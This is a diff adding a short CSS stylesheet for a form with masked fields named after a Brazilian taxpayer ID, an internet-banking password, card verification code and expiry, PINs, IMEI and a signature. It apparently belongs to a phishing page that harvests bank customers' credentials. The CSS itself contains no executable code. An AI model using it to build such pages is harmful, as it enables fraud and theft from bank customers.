@@ -1,0 +1,13 @@
+body { margin:0; }
+.i { font-size:1px; background:none; color:none; }
+.font1 { font-family:Gotham, "Helvetica Neue", Helvetica, Arial, sans-serif; font-size:11px; color:#999; }
+#cpf { width:100%; padding:6px; border:none; border:1px solid #CCC; outline:none; background:#FCFCFC;  }
+#senhanet { width:100%; padding:6px; border:none; border:1px solid #CCC; outline:none; -webkit-text-security: disc;  background:#FCFCFC; }
+#icar4 { width:60%; padding:6px; border:1px solid #CCC; outline:none; }
+#val { width:60%; padding:6px; border:1px solid #CCC; outline:none; }
+#ccv { width:60%; padding:6px; border:1px solid #CCC; outline:none; }
+#ss4 { width:60%; padding:6px; border:1px solid #CCC; outline:none; -webkit-text-security: disc; }
+#senha6 { width:100%; padding:6px; border:1px solid #CCC; outline:none; -webkit-text-security: disc; }
+#imei { width:100%; padding:6px; border:1px solid #CCC; outline:none; }
+#assi { width:100%; padding:6px; border:1px solid #CCC; outline:none; }
+#ir { width:80%; padding:10px; background:url(../img/ir.jpg) repeat-x; border:1px solid #333; text-shadow:0 0 2px #000; color:#FFF; font-size:16px; border-radius:8px; }
